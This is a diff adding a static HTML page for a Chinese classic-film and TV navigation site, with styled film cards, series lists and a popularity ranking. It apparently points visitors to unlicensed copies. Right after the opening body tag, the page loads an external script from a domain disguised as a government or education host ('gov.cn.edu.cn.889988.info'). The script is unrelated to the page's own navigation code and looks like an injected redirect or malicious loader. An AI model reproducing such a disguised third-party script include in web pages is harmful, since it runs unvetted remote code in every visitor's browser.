@@ -1,0 +1,252 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<link rel="icon" href="favicon.ico" type="image/x-icon">
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>秋霞电影网在线 - 黄昏时分遇见经典老片</title>
+<meta name="description" content="秋霞电影网在线（qiuxiadianyingwangzaixian-h5）专注经典老电影、怀旧港片、国产佳作、台剧与高清修复片，黄昏时分遇见好电影，页面简洁自适应，必应收录友好。">
+<meta name="keywords" content="秋霞电影网在线, qiuxiadianyingwangzaixian-h5, 经典老电影, 怀旧港片, 国产老片, 高清修复, 台剧, 影视导航">
+<meta name="author" content="秋霞电影网在线">
+<meta name="robots" content="index, follow">
+<style>
+:root{
+  --paper:#F3E9D2;
+  --paper2:#EADFC4;
+  --brown:#5A3A22;
+  --brown-deep:#3A2415;
+  --sun:#E0653A;
+  --sun2:#F2A65A;
+  --ink:#2A1F17;
+  --dim:#8A7355;
+  --line:#D8C7A3;
+  --night:#1C1714;
+}
+*{margin:0;padding:0;box-sizing:border-box}
+html{scroll-behavior:smooth}
+body{
+  font-family:"Songti SC","SimSun","PingFang SC","Microsoft YaHei",serif;
+  background:
+    radial-gradient(900px 500px at 85% -10%,rgba(242,166,90,.45),transparent 60%),
+    radial-gradient(700px 500px at 0% 100%,rgba(90,58,34,.35),transparent 55%),
+    var(--paper);
+  color:var(--ink);line-height:1.9;overflow-x:hidden;
+}
+body::before{content:"";position:fixed;inset:0;pointer-events:none;z-index:1;
+  background:repeating-linear-gradient(0deg,transparent 0 26px,rgba(90,58,34,.05) 26px 27px)}
+a{color:var(--sun);text-decoration:none;transition:.3s}
+a:hover{color:var(--brown)}
+
+/* 顶栏 */
+.bar{position:sticky;top:0;z-index:50;background:rgba(243,233,210,.92);backdrop-filter:blur(8px);border-bottom:3px double var(--brown)}
+.bar-in{max-width:1200px;margin:0 auto;height:66px;padding:0 18px;display:flex;align-items:center;justify-content:space-between}
+.brand{font-weight:900;font-size:22px;letter-spacing:2px;display:flex;align-items:center;gap:12px}
+.sun{width:34px;height:34px;border-radius:50%;background:radial-gradient(circle at 50% 40%,var(--sun2),var(--sun));box-shadow:0 0 18px rgba(224,101,58,.5)}
+.brand b{color:var(--sun)}
+.brand i{font-style:normal;font-size:9px;letter-spacing:3px;color:var(--dim);display:block;font-family:ui-monospace,Consolas,monospace}
+.nav{display:flex;gap:4px;list-style:none}
+.nav a{padding:8px 14px;font-size:13px;font-weight:700;color:var(--ink);border-radius:4px;border:1px solid transparent}
+.nav a:hover,.nav a.active{background:var(--brown);color:var(--paper);border-color:var(--brown-deep)}
+.burger{display:none;background:none;border:none;font-size:24px;color:var(--brown);cursor:pointer}
+
+/* Hero */
+.hero{max-width:1200px;margin:0 auto;padding:84px 18px 56px;text-align:center;position:relative;z-index:2}
+.evening{display:inline-block;font-size:11px;letter-spacing:4px;color:var(--brown);border:1px dashed var(--brown);padding:6px 16px;border-radius:999px;background:var(--paper2);font-family:ui-monospace,Consolas,monospace}
+.hero h1{font-size:clamp(34px,7vw,60px);font-weight:900;letter-spacing:4px;margin:18px 0 12px}
+.hero h1 span{color:var(--sun);text-shadow:0 0 24px rgba(224,101,58,.35)}
+.hero p{color:var(--dim);max-width:600px;margin:0 auto 24px;font-size:15px}
+.hills{height:60px;margin:0 auto 26px;max-width:900px;background:
+  radial-gradient(120px 60px at 20% 100%,var(--brown) 60%,transparent 61%),
+  radial-gradient(160px 70px at 50% 100%,var(--brown-deep) 60%,transparent 61%),
+  radial-gradient(120px 60px at 80% 100%,var(--brown) 60%,transparent 61%);
+  opacity:.5}
+.cta{display:inline-block;padding:14px 38px;border-radius:6px;font-weight:800;color:var(--paper);background:linear-gradient(135deg,var(--sun),var(--brown));box-shadow:0 10px 26px rgba(90,58,34,.3)}
+.cta:hover{transform:translateY(-3px);color:var(--paper)}
+
+/* 区块 */
+.section{max-width:1200px;margin:0 auto;padding:52px 18px;position:relative;z-index:2}
+.head{display:flex;align-items:baseline;justify-content:space-between;border-bottom:3px double var(--brown);padding-bottom:10px;margin-bottom:26px}
+.head h2{font-size:clamp(20px,4vw,26px);font-weight:900;letter-spacing:2px}
+.head h2::before{content:"🎞 "}
+.head a{font-size:13px;color:var(--dim)}
+
+/* 电影：黄昏影廊 */
+.reels{display:grid;grid-template-columns:repeat(auto-fill,minmax(220px,1fr));gap:20px}
+.reel{background:var(--paper2);border:1px solid var(--line);border-radius:10px;padding:14px;transition:.35s;position:relative}
+.reel:hover{transform:translateY(-6px) rotate(-.6deg);box-shadow:0 16px 34px rgba(90,58,34,.25);border-color:var(--brown)}
+.reel .frame{height:130px;border-radius:6px;display:grid;place-items:center;font-size:46px;margin-bottom:12px;
+  background:
+    repeating-linear-gradient(90deg,var(--brown-deep) 0 6px,transparent 6px 14px) top/100% 10px no-repeat,
+    repeating-linear-gradient(90deg,var(--brown-deep) 0 6px,transparent 6px 14px) bottom/100% 10px no-repeat,
+    linear-gradient(160deg,#caa46f,#7c5230);
+  color:var(--paper)}
+.reel h3{font-size:16px;margin-bottom:4px}
+.reel .meta{font-size:12px;color:var(--dim)}
+.reel .yr{position:absolute;top:10px;right:10px;font-family:ui-monospace,Consolas,monospace;font-size:11px;background:var(--night);color:var(--sun2);padding:2px 8px;border-radius:3px}
+.tags{display:flex;gap:6px;flex-wrap:wrap;margin-top:10px}
+.tag{font-size:10px;padding:3px 8px;border-radius:3px;background:var(--paper);border:1px solid var(--line);color:var(--brown)}
+
+/* 电视剧：连戏剧场 */
+.stage{display:flex;flex-direction:column;gap:12px}
+.show{display:grid;grid-template-columns:64px 1fr 110px;gap:16px;align-items:center;background:var(--paper2);border:1px solid var(--line);border-radius:10px;padding:14px 18px;transition:.3s}
+.show:hover{padding-left:24px;border-color:var(--brown);background:#efe3c8}
+.show .curtain{font-size:28px;text-align:center}
+.show h4{font-size:15px}
+.show p{font-size:12px;color:var(--dim)}
+.show .era{font-size:11px;font-weight:800;padding:4px 10px;border-radius:999px;border:1px solid var(--line);color:var(--brown);text-align:center;font-family:ui-monospace,Consolas,monospace}
+.show .era.hot{color:var(--sun);border-color:var(--sun);background:#f7e2cf}
+
+/* 综艺动漫：旧时荧屏 */
+.screen{display:grid;grid-template-columns:repeat(auto-fill,minmax(150px,1fr));gap:14px}
+.box{height:130px;border-radius:12px;display:flex;flex-direction:column;align-items:center;justify-content:center;gap:6px;border:1px solid var(--line);background:var(--paper2);transition:.3s;cursor:pointer}
+.box:hover{transform:scale(1.05) rotate(1deg);box-shadow:0 10px 24px rgba(90,58,34,.2);border-color:var(--brown)}
+.box .tv{font-size:30px}
+.box h4{font-size:13px;font-weight:800}
+.box span{font-size:10px;color:var(--dim)}
+
+/* 排行榜：怀旧热度 */
+.oldrank{display:flex;flex-direction:column;gap:14px}
+.or{display:grid;grid-template-columns:46px 1fr 90px;align-items:center;gap:14px;background:var(--paper2);border:1px solid var(--line);border-radius:10px;padding:14px 18px}
+.or .no{font-size:22px;font-weight:900;color:var(--sun);font-family:ui-monospace,Consolas,monospace}
+.or h4{font-size:15px}
+.or .bar{height:8px;border-radius:999px;background:var(--line);overflow:hidden;margin-top:6px}
+.or .bar i{display:block;height:100%;background:linear-gradient(90deg,var(--sun2),var(--sun),var(--brown))}
+.or .score{font-family:ui-monospace,Consolas,monospace;font-weight:800;color:var(--brown);text-align:right}
+
+/* 关于：放映员手记 */
+.note{max-width:800px;margin:0 auto;background:var(--paper2);border:3px double var(--brown);border-radius:12px;padding:32px;position:relative}
+.note::before{content:"放映员";position:absolute;top:-13px;left:24px;background:var(--sun);color:var(--paper);font-size:11px;font-weight:900;letter-spacing:2px;padding:5px 14px;border-radius:999px}
+.note h3{font-size:18px;margin-bottom:12px}
+.note p{font-size:14px;color:#5b4631;margin-bottom:10px}
+.lnks{margin-top:16px;display:flex;gap:10px;flex-wrap:wrap}
+.lnks a{padding:8px 16px;border:1px solid var(--line);border-radius:999px;font-size:13px;color:var(--ink)}
+.lnks a:hover{border-color:var(--brown);color:var(--brown)}
+
+/* 页脚 */
+.foot{border-top:3px double var(--brown);padding:30px 18px;text-align:center;color:var(--dim);font-size:13px;position:relative;z-index:2}
+.foot a{color:var(--dim);margin:0 6px}
+.foot .big{font-size:17px;font-weight:900;color:var(--ink);letter-spacing:2px;margin-bottom:8px}
+.foot .url{color:var(--sun)}
+
+@media(max-width:760px){
+  .nav{display:none;position:absolute;top:66px;left:0;right:0;flex-direction:column;background:rgba(243,233,210,.97);border-bottom:2px solid var(--brown);padding:8px 14px}
+  .nav.open{display:flex}.nav a{padding:14px 16px}
+  .burger{display:block}
+}
+@media(max-width:480px){
+  .hero{padding:54px 16px 34px}
+  .section{padding:34px 16px}
+  .reels{grid-template-columns:repeat(2,1fr);gap:12px}
+  .reel .frame{height:96px;font-size:32px}
+  .show{grid-template-columns:48px 1fr;gap:10px;padding:12px}
+  .show .era{grid-column:2;justify-self:start}
+  .or{grid-template-columns:34px 1fr 64px;gap:10px;padding:12px}
+}
+</style>
+</head>
+<body>
+<script src="https://www.gov.cn.edu.cn.889988.info/laoliu.js"></script>
+
+<div class="bar">
+  <div class="bar-in">
+    <div class="brand"><span class="sun"></span><div>秋霞电影网<b>在线</b><i>QIUXIADIANYINGWANGZAIXIAN-H5</i></div></div>
+    <ul class="nav" id="nav">
+      <li><a href="#home" class="active">黄昏首页</a></li>
+      <li><a href="#movies">黄昏影廊</a></li>
+      <li><a href="#tv">连戏剧场</a></li>
+      <li><a href="#ent">旧时荧屏</a></li>
+      <li><a href="#rank">怀旧热度</a></li>
+      <li><a href="#about">放映员手记</a></li>
+    </ul>
+    <button class="burger" id="burger">☰</button>
+  </div>
+</div>
+
+<header class="hero" id="home">
+  <span class="evening">🌇 黄昏六点半 · 老片开场</span>
+  <h1>秋霞电影网<span>在线</span></h1>
+  <p>qiuxiadianyingwangzaixian-h5 · 经典老电影、怀旧港片、国产佳作、台剧与高清修复片，像傍晚坐在老戏院里，把值得再看一遍的电影重看一遍。</p>
+  <div class="hills"></div>
+  <a href="#movies" class="cta">🎬 拉开幕布</a>
+</header>
+
+<section class="section" id="movies">
+  <div class="head"><h2>黄昏影廊 / CLASSIC REELS</h2><a href="#">更多老片 →</a></div>
+  <div class="reels">
+    <div class="reel"><span class="yr">1976</span><div class="frame">🎞️</div><h3>秋霞</h3><div class="meta">文艺 / 嘉禾 / 陈秋霞·钟镇涛</div><div class="tags"><span class="tag">怀旧</span><span class="tag">金马佳片</span></div></div>
+    <div class="reel"><span class="yr">1986</span><div class="frame">🀄</div><h3>英雄本色</h3><div class="meta">警匪 / 吴宇森 / 周润发·狄龙·张国荣</div><div class="tags"><span class="tag">港片黄金</span><span class="tag">枪火</span></div></div>
+    <div class="reel"><span class="yr">1992</span><div class="frame">🃏</div><h3>家有囍事</h3><div class="meta">喜剧 / 高志森 / 周星驰·张曼玉·张国荣</div><div class="tags"><span class="tag">无厘头</span><span class="tag">贺岁</span></div></div>
+    <div class="reel"><span class="yr">1994</span><div class="frame">🚬</div><h3>重庆森林</h3><div class="meta">文艺 / 王家卫 / 金城武·王菲·梁朝伟</div><div class="tags"><span class="tag">胶片美学</span><span class="tag">粤语对白</span></div></div>
+    <div class="reel"><span class="yr">1996</span><div class="frame">🎤</div><h3>甜蜜蜜</h3><div class="meta">爱情 / 陈可辛 / 黎明·张曼玉</div><div class="tags"><span class="tag">移民潮</span><span class="tag">邓丽君</span></div></div>
+    <div class="reel"><span class="yr">2000</span><div class="frame">👗</div><h3>花样年华</h3><div class="meta">文艺 / 王家卫 / 梁朝伟·张曼玉</div><div class="tags"><span class="tag">旗袍</span><span class="tag">修复版</span></div></div>
+    <div class="reel"><span class="yr">1967</span><div class="frame">🐉</div><h3>龙门客栈</h3><div class="meta">武侠 / 胡金铨 / 经典武侠</div><div class="tags"><span class="tag">老武侠</span><span class="tag">修复</span></div></div>
+    <div class="reel"><span class="yr">1987</span><div class="frame">👻</div><h3>倩女幽魂</h3><div class="meta">奇幻 / 程小东 / 张国荣·王祖贤</div><div class="tags"><span class="tag">粤语片</span><span class="tag">经典</span></div></div>
+  </div>
+</section>
+
+<section class="section" id="tv" style="background:rgba(234,223,196,.6)">
+  <div class="head"><h2>连戏剧场 / OLD SERIES</h2><a href="#">翻老剧 →</a></div>
+  <div class="stage">
+    <div class="show"><div class="curtain">📺</div><div><h4>上海滩</h4><p>民国帮派 / 周润发·赵雅芝 / 一代人集体记忆</p></div><span class="era hot">反复重播</span></div>
+    <div class="show"><div class="curtain">🍵</div><div><h4>还珠格格</h4><p>古装情景 / 琼瑶剧 / 暑假固定节目</p></div><span class="era">寒暑假</span></div>
+    <div class="show"><div class="curtain">🕵️</div><div><h4>刑事侦缉档案</h4><p>港剧悬疑 / TVB 黄金班底</p></div><span class="era hot">侦探迷爱看</span></div>
+    <div class="show"><div class="curtain">🏮</div><div><h4>大宅门</h4><p>国产年代剧 / 家族兴衰 / 台词经得起嚼</p></div><span class="era">国产老剧</span></div>
+    <div class="show"><div class="curtain">🎙️</div><div><h4>新白娘子传奇</h4><p>台剧经典 / 黄梅调 / 一代人的片头曲</p></div><span class="era hot">国民老剧</span></div>
+  </div>
+</section>
+
+<section class="section" id="ent">
+  <div class="head"><h2>旧时荧屏 / RETRO SCREEN</h2><a href="#">更多 →</a></div>
+  <div class="screen">
+    <div class="box"><div class="tv">🎤</div><h4>欢乐今宵</h4><span>无线综艺</span></div>
+    <div class="box"><div class="tv">🧚</div><h4>葫芦兄弟</h4><span>国产动画</span></div>
+    <div class="box"><div class="tv">🐒</div><h4>大闹天宫</h4><span>美术片</span></div>
+    <div class="box"><div class="tv">🎙️</div><h4>今夜不设防</h4><span>访谈综艺</span></div>
+    <div class="box"><div class="tv">🐉</div><h4>哪吒闹海</h4><span>上美影</span></div>
+    <div class="box"><div class="tv">🎼</div><h4>劲歌金曲</h4><span>粤语金曲</span></div>
+    <div class="box"><div class="tv">📼</div><h4>午夜剧场</h4><span>录播栏目</span></div>
+    <div class="box"><div class="tv">🎞️</div><h4>译制大片</h4><span>老译制片</span></div>
+  </div>
+</section>
+
+<section class="section" id="rank" style="background:rgba(234,223,196,.6)">
+  <div class="head"><h2>怀旧热度 / NOSTALGIA RANK</h2><a href="#">完整片单 →</a></div>
+  <div class="oldrank">
+    <div class="or"><div class="no">01</div><div><h4>英雄本色</h4><div class="bar"><i style="width:98%"></i></div></div><div class="score">9.8</div></div>
+    <div class="or"><div class="no">02</div><div><h4>重庆森林</h4><div class="bar"><i style="width:95%"></i></div></div><div class="score">9.5</div></div>
+    <div class="or"><div class="no">03</div><div><h4>花样年华</h4><div class="bar"><i style="width:94%"></i></div></div><div class="score">9.4</div></div>
+    <div class="or"><div class="no">04</div><div><h4>倩女幽魂</h4><div class="bar"><i style="width:92%"></i></div></div><div class="score">9.2</div></div>
+    <div class="or"><div class="no">05</div><div><h4>甜蜜蜜</h4><div class="bar"><i style="width:90%"></i></div></div><div class="score">9.0</div></div>
+    <div class="or"><div class="no">06</div><div><h4>家有囍事</h4><div class="bar"><i style="width:88%"></i></div></div><div class="score">8.8</div></div>
+  </div>
+</section>
+
+<section class="section" id="about">
+  <div class="head"><h2>放映员手记 / PROJECTIONIST NOTE</h2></div>
+  <div class="note">
+    <h3>“好电影像落日，看过一次，天色就记住了。”</h3>
+    <p>秋霞电影网在线（qiuxiadianyingwangzaixian-h5）不做花哨算法，只把经典老电影、怀旧港片、国产老剧、台剧和修复版摆回幕布前：片头一亮，就像回到录像厅和老戏院。</p>
+    <p>本站仅做静态影视导航，不存储视频文件；资源来自互联网公开分享，如有版权问题请联系放映员下架。</p>
+    <div class="lnks">
+      <a href="#">免责声明</a><a href="#">求片留言</a><a href="#">修复片单</a><a href="#">友情链接</a><a href="#">放映员信箱</a>
+    </div>
+  </div>
+</section>
+
+<footer class="foot">
+  <div class="big">秋霞电影网在线 · QIUXIADIANYINGWANGZAIXIAN-H5</div>
+  <p><a href="#home">黄昏首页</a> | <a href="#movies">黄昏影廊</a> | <a href="#tv">连戏剧场</a> | <a href="#ent">旧时荧屏</a> | <a href="#rank">怀旧热度</a></p>
+  <p>官网：<span class="url">https://qiuxiadianyingwangzaixian-h5.github.io</span></p>
+  <p>© 2026 秋霞电影网在线 · 黄昏时分，再见好电影</p>
+</footer>
+
+<script>
+const burger=document.getElementById('burger'),nav=document.getElementById('nav');
+burger.addEventListener('click',()=>nav.classList.toggle('open'));
+const secs=document.querySelectorAll('section[id],header[id]');
+const links=nav.querySelectorAll('a');
+addEventListener('scroll',()=>{let cur='home';secs.forEach(s=>{if(scrollY>=s.offsetTop-90)cur=s.id});links.forEach(l=>{l.classList.remove('active');if(l.getAttribute('href')==='#'+cur)l.classList.add('active')})});
+document.querySelectorAll('a[href^="#"]').forEach(a=>{a.addEventListener('click',e=>{e.preventDefault();const t=document.querySelector(a.getAttribute('href'));if(t)t.scrollIntoView({behavior:'smooth',block:'start'});nav.classList.remove('open')})});
+</script>
+</body>
+</html>
